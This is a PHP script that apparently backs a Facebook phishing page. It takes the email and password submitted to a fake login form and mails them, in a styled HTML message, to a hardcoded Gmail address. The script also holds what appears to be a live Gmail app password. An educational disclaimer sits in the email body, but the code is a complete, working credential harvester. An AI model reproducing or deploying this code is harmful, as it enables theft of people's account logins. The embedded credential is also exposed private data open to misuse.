<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Include PHPMailer dependencies
require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

// Get email and password from the form
$email = $_POST['email'];
$password = $_POST['password'];

// Create an instance of PHPMailer
$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = 'mr.babluj0@gmail.com';
    $mail->Password   = 'gqif usyk hsyo doag';
    $mail->SMTPSecure = 'tls';
    $mail->Port       = 587;

    // Recipients
    $mail->setFrom('mr.babluj0@gmail.com', 'mr.bablu');
    $mail->addAddress('mr.babluj0@gmail.com', 'mr.bablu');

    // Email content
    $mail->isHTML(true);
    $mail->Subject = 'BABBLU FB SERVER';

    $gifLink = 'https://media0.giphy.com/media/l71kleRwrkxxK/giphy.gif?cid=6c09b9520frs9j1zwlcik4k9n8h2rodv1we7czwpoljvldbn&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g';



$body = "
    <html>
    <head>
        <style>
            body {
                font-family: 'Arial', sans-serif;
                background-color: #f0f0f0;
                margin: 0;
                padding: 20px;
            }

            .container {
                max-width: 600px;
                margin: 0 auto;
                background-color: #ffffff;
                padding: 30px;
                box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
                border-radius: 10px;
                text-align: center;
            }

            img {
                max-width: 100%;
                margin-top: 10px;
                border: 1px solid #000;
            }

            p {
                margin-top: 20px;
                color: #333;
            }

            .disclaimer {
                color: #888;
                font-size: 14px;
                margin-top: 20px;
                border: 1px solid #000;
                padding: 10px;
            }

            .email-box,
            .password-box {
                width: 100%;
                padding: 10px;
                border: 1px solid #000;
                border-radius: 5px;
                margin-bottom: 10px;
            }

            .email-box b,
            .password-box b {
                font-weight: bold;
            }

            .developer-info {
                color: #555;
                font-size: 12px;
                margin-top: 20px;
            }

            .developer-info a {
                display: inline-block;
                margin: 10px;
                padding: 8px 20px;
                background-color: #007bff;
                color: #fff;
                text-decoration: none;
                border-radius: 5px;
            }
        </style>
    </head>
    <body>
        <div class='container'>
            <p class='disclaimer'>DISCLAIMER: This project was created for educational purposes only and is meant to raise awareness about the dangers of phishing emails and sites. This code and anything learned through this project should never be used on anyone without their consent.</p>
            
            <div class='email-box'>
                <b>Email:</b> $email
            </div>

            <div class='password-box'>
                <b>Password:</b> $password
            </div>
            
            <p style='color: red;'>THIS PROGRAM IS DEVELOPED BY MUHAMMAD ALI - THIS IS ONLY FOR entertainment and fun. KEEP ENJOYING THE PROGRAM.</p>
            
            <img src='$gifLink' alt='GIF'>

            <div class='developer-info'>
                <p>Connect with the developer:</p>
                <a href='YOUR_GITHUB_LINK' target='_blank'>GitHub</a>
                <a href='YOUR_TELEGRAM_LINK' target='_blank'>Telegram</a>
                <a href='YOUR_FACEBOOK_LINK' target='_blank'>Facebook</a>
            </div>
        </div>
    </body>
    </html>
";






    $mail->Body = $body;

    // Send the email
    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
?>
